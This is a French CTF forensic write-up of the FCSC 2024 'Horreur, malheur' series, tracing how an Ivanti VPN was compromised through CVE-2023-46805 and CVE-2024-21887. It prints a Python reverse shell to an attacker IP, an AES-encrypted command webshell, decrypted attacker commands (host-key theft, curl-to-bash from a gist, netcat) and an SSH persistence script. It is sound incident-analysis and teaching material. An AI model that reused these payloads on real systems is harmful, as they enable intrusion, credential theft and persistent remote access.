---
layout: post
title: Horreur Malheur
tags: Write-up 2024 forensic logs linux CVE-2023-46805 CVE-2024-21887 FCSC
---
## Category
Forensic
## Description
Introduction commune à la série `Horreur, malheur`

Vous venez d'être embauché en tant que Responsable de la Sécurité des Systèmes d'Information (RSSI) d'une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : `VPN compromis (intégrité). Version 22.3R1 b1647`.

Note : La première partie (`Archive chiffrée`) débloque les autres parties, à l'exception de la seconde partie (`Accès initial`) qui peut être traitée indépendamment. Nous vous recommandons de traiter les parties dans l'ordre.



> Before reading, it's important to notice that I solved the challenges in the order 2 -> 1 -> 3 -> 4

And because a meme is always welcome, even if its not always the right tool to solve a forensic challenge, i used intensievly grep for this challenge so I have to mention it :
![grepping.jpg](https://acmo0.github.io/assets/img/memes/grepping.jpg)



## Horreur, malheur 1/5 - Archive chiffrée

> Sur la clé USB, vous trouvez deux fichiers : une archive chiffrée et les journaux de l'équipement. Vous commencez par lister le contenu de l'archive, dont vous ne connaissez pas le mot de passe. Vous gardez en tête un article que vous avez lu : il paraît que les paquets installés sur l'équipement ne sont pas à jour...
> 
> Le flag est le mot de passe de l'archive.
>
> Remarque : Le mot de passe est long et aléatoire, inutile de chercher à le bruteforcer.

### Solution



For this first challenge, we have an encrypted archive named `archive.encrypted`. I was already aware that encrypted archive could be vulnerable to plaintext attack if they use the ZipCrypto encryption method. Furthermore, it is mentioned that it's useless to bruteforce the passphrase.

So first, let's download the archive and list various informations using `7z l -slt archive.encrypted`
```
--
Path = archive.encrypted
Type = zip
Physical Size = 65470

----------
Path = tmp/temp-scanner-archive-20240315-065846.tgz
Folder = -
Size = 64697
Packed Size = 64714
Modified = 2024-03-15 15:58:46
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 126407B2
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = home/VERSION
Folder = -
Size = 194
Packed Size = 120
Modified = 2022-12-05 17:06:09
Created = 
Accessed = 
Attributes = _ -rwxr-xr-x
Encrypted = +
Comment = 
CRC = 6C3A35F8
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = data/flag.txt
Folder = -
Size = 33
Packed Size = 44
Modified = 2024-03-15 15:32:38
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 07FF9365
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
```

Ok, so we know that this archive is indeed encrypted using ZipCrypto and contains 3 files. However, the method used is `Deflate` and not `Store`, which means that the file is compressed and then encrypted (I presume), and it will be a problem. To crack it, after one search on internet I found the tool [bkcrack](https://github.com/kimci86/bkcrack) on github, it needs at least 12 known bytes (some techniques using the CRC32 allows to reduce the number of bytes needed) to recover the keys of the archive (not the password but it allows us to decrypt it).
But I said that files were encrypted in the archive using the Deflate method, so we need to guess 12 bytes of the compressed plaintext, which is almost impossible without knowing the entire file.

Lets recap the situation : I have an encrypted archive and I have to find/guess entirely in order to decrypt it.
The first file is `flag.txt`, which I can't guess because it means I've already solve the challenge,
the second one is `temp-scanner-archive-20240315-065846.tgz` (that I could have used to crack the zip if the method wasn't *Deflate* but *Store*) and the last one is `VERSION`. 
I've immediatly been conviced that I have to guess `VERSION` because this has (almost) nothing to do in this archive and seems relatively predictible since it looks like a file from a build or a package.


Using an information gived in the description of the challenge (`VPN compromis (intégrité). Version 22.3R1 b1647`), I started to search on internet something that could look like our file. I found nothing very usefull for the given problem but I saw that the VPN mentionned could be the Ivanti's VPN that suffers from multiple CVEs for this version. I take a look at the logs (from the second challenge) and found that a python module is named uWGSI (version 2.0.9). I download this version and started reverse engineering and almost reconstruct the `VERSION` that I was looking for but the CRC32 wasn't the same. I continue to search and then found [this website](https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce
) about the exploitation of CVE-2023-46805 and CVE-2024-21887 which affects our version of Ivanti product.
I found this spinnet of code :

`cat /home/VERSION`
```
export DSREL_MAJOR=22
export DSREL_MINOR=3
export DSREL_MAINT=1
export DSREL_DATAVER=4802
export DSREL_PRODUCT=ssl-vpn
export DSREL_DEPS=ive
export DSREL_BUILDNUM=1647
export DSREL_COMMENT="R1"
```

I put it in a file and check the CRC32 which corresponds to the CRC32 of the file `home/VERSION` in our archive !

Now lets crack it using bkrack :
```bash
zip VERSION		// to get the file compressed (I hope with the same algorithm used in the archive because I tried various algorithm that were not successful)

./bkcrack-1.6.1-Linux/bkcrack -C archive.encrypted -c home/VERSION -P VERSION_test.zip -p VERSION_test
//	.
//	.
//	.
// [23:25:58] Keys
// 6ed5a98a a1bb2e0e c9172a2f

/bkcrack-1.6.1-Linux/bkcrack -C archive.encrypted -k 6ed5a98a a1bb2e0e c9172a2f -U archive.decrypted coucou
```
Now I am able to open and inflate the archive `archive.decrypted` with the password `coucou`.

The flag is in `data/flag.txt`

## Horreur, malheur 2/5 - Accès initial

> Sur la clé USB, vous trouvez deux fichiers : une archive chiffrée et les journaux de l'équipement. Vous focalisez maintenant votre attention sur les journaux. L'équipement étant compromis, vous devez retrouver la vulnérabilité utilisée par l'attaquant ainsi que l'adresse IP de ce dernier.
>
> Le flag est au format : FCSC{CVE-XXXX-XXXXX:<adresse_IP>}.

### Solution

Ok, so I know that a product is surely a VPN, with a particular version of build that is likely to be vulnerable to a known CVE.
After few search using the build version I'm almost sure that it's a VPN from Ivanti that is affected by CVE-2023-46805 and CVE-2024-21887 (which is coherent considering the dates in te logs). By looking at the description of the CVE, I understand that the attacker potentially creates a reverse shell/execute a spinnet of code on the server. Basically, the attack sends a payload on particular endpoints of the API to inject code that will be executed on the server.

So, I looked at the logs and especially at the requests made to the webserver (`grep` is your friend), which contains a lot of `404` return code (so `grep -v` is your friend again) and found some weird requests which looks like that :
```
GET /api/v1/cav/client/health?cmd=K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D
```
It tried first to decode it in base64 (or other base) and tried some various compression algorithm but it still remains unreadble and have no common file header.

Because a part of the software is using python, I though that maybe the payload was executing some python especially as it's a common practice to create reverse shells/RCE with python. And then I found this line (`grep` is always your friend):
```
python -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
```

So, I have the CVEs (I first entered the wrong one because I forget which one allows to execute remote code and which one allows some privesc), and the IP `20.13.3.0`.

*Note : the attacker send this payload which is a bash command injection that is proved by this line inside the logs : /bin/sh -c /home/perl5/bin/perl /home/perl/AwsAzureTestConnection.pl ;python -c 'import socket,subprocess;s=socke...  The payload create a TCP socket (that is also visible in the logs) and connect to the attacker IP via the port 44444 and start a `sh` shell, whith stdin, stdout and stderr redirected to the socket*

## Horreur, malheur 3/5 - Simple persistance

> Vous avez réussi à déchiffrer l'archive. Il semblerait qu'il y ait dans cette archive une autre archive, qui contient le résultat du script de vérification d'intégrité de l'équipement.
>
> À l'aide de cette dernière archive et des journaux, vous cherchez maintenant les traces d'une persistance déposée et utilisée par l'attaquant.

### Solution

According to the description, it's time to take a look a the archive that we decrypted in the first challenge and inflat the archive inside it. Inside this archive, there is the result of an integrity check of the server. I take a look at the files and start investigating the python library. I saw that the API was a vector of attack, so I quickly begin to look at the code inside the api folder. All scripts seems OK, except one which ge my attention immedialtly when I opened it : `api/resources/health.py` which imports `base64`, `zlib` and `Pycryptodome` for AES.

Few lines after we have the following code :
```python
class Health(Resource):
    """
    Handles requests that are coming for client to post the application data.
    """

    def get(self):
        try:
            with open("/data/flag.txt", "r") as handle:
                dskey = handle.read().replace("\n", "")
            data = request.args.get("cmd")
            if data:
                aes = AES.new(dskey.encode(), AES.MODE_ECB)
                cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
                result = subprocess.getoutput(cmd)
                if not isinstance(result, bytes): result = str(result).encode()
                result = base64.b64encode(aes.encrypt(pad(zlib.compress(result), 32))).decode()        
                return result, 200
        except Exception as e:
            return str(e), 501
```
This code spinnet reads the file `/data/flag.txt` and uses it content as an AES key, then get the value of the parameter `cmd` in the GET request to the API path, decompress it, decrypt it with the AES cipher and then execute it.
So if I get the requests made at this endpoint of the API, I am able to decrypt it because I have the file `flag.txt` from the first part.

*Note : the following code was surely installed by the attackers using the reverse shell seen in the last part, it looks like the [FRAMESTING webshell](https://www.mandiant.com/resources/blog/investigating-ivanti-zero-day-exploitation)*


It's time to grep !
![grep again !](https://acmo0.github.io/assets/img/grep_again.gif)

```bash
grep -o 'cmd=.*' cav_webserv.log | grep -v 404 | sed -En 's/cmd=(.*+%3D) .*/\1/p'
// get the calls to the api path - discard not found - extract the base64

// DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D
// K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D
// /ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D
// Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D
// yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D
// 7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D
// WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D
// G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D
// QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D
```

Then put it into cyberchef to URL decode and put it in the following python script :
```python
import base64
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad


dskey = "50c53be3eece1dd551bebffe0dd5535c"
commands = ["DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA=", "K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ=", "/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ==", "Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA==", "yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ+74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ+/o=", "E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7+yv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT", "7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn+XeiWHpCWr+yyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD+0nZc8=", "WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz+JxmwQdxnJwNg==", "G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM=", "QV2ImqgrjrL7+tofpO12S9bqgDCRHYXGJwaOIihb+NI="]
for data in commands:
	aes = AES.new(dskey.encode(), AES.MODE_ECB)
	cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
	print(cmd.decode())
```

Which outputs :
```bash
id
ls /
echo FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}
cat /data/runtime/etc/ssh/ssh_host_rsa_key
/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a
cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d '"' -f 2 | tr -d '
' | grep -o . | tac | tr -d '
'  > /tmp/b
a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep 'raw_url' | cut -d '"' -f 4 > /tmp/c
c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash
rm /tmp/a /tmp/b /tmp/c
nc 146.0.228.66:1337
```

And here is our flag !

## Horreur, malheur 4/5 - Pas si simple persistance

> Vous remarquez qu'une fonctionnalité built-in de votre équipement ne fonctionne plus et vous vous demandez si l'attaquant n'a pas utilisé la première persistance pour en installer une seconde, moins "visible"...

> Vous cherchez les caractéristiques de cette seconde persistance : protocole utilisé, port utilisé, chemin vers le fichier de configuration qui a été modifié, chemin vers le fichier qui a été modifié afin d'établir la persistance.

> Le flag est au format : FCSC{<protocole>:<port>:<chemin_absolu>:<chemin_absolu>}

### Solution

My first reflex was to try to figure out was the lines of codes that we get right before do. I executed them (carefully and I take care that they execute nothing harmful)

I stopped the execution at the line ```c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash``` and just execute ```c=`cat /tmp/c`;/home/bin/curl -k ${c} -s```. Then I display `c` :
```bash
sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
pkill sshd-ive > /dev/null 2>&1
gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
gzip /data/pkg/data-backup.tar > /dev/null 2>&1
mv /data/pkg/data-backup.tar.gz /data/runtime/etc/ssh/sshd_server_confi > /dev/null 2>&1
```
So, the payload finally execute the following code which does the following actions :
- Replace the port used by ssh for the port 1337
- Comment the line `ForceCommand` and the ssh config
- Allow the authentication by public key
- Add a valid file for public key authentication for ssh
- decompress the archive `/data/pkg/data-backup.tgz`
- Append the modified config to the backup
- Zip the modified backup
- Replace the original backup by the modified backup
- All outputs are redirected to /dev/null so it should be complicated to view the output of these commands

So the flag is FCSC{ssh:1337:/data/runtime/etc/ssh/sshd_server_config:/data/runtime/etc/ssh/sshd_server_confi}

## Horreur, malheur 5/5 - Un peu de CTI
> Vous avez presque fini votre analyse ! Il ne vous reste plus qu'à qualifier l'adresse IP présente dans la dernière commande utilisée par l'attaquant.
>
> Vous devez déterminer à quel groupe d'attaquant appartient cette adresse IP ainsi que l'interface de gestion légitime qui était exposée sur cette adresse IP au moment de l'attaque.
>
>Le flag est au format : FCSC{<UNCXXXX>:<nom du service>}.
>
> Remarque : Il s'agit d'une véritable adresse IP malveillante, n’interagissez pas directement avec cette adresse IP.

### Solution 
> Note : I didn't find the entire solution

By looking at the script found in part.3, it's obvious that the IP should be 146.0.228.66. A quick search on internet make me think that the attacker is named under the code : UNC5221.
However, after investigation, I did't find the other part of the flag


*Write-up author : acmo0*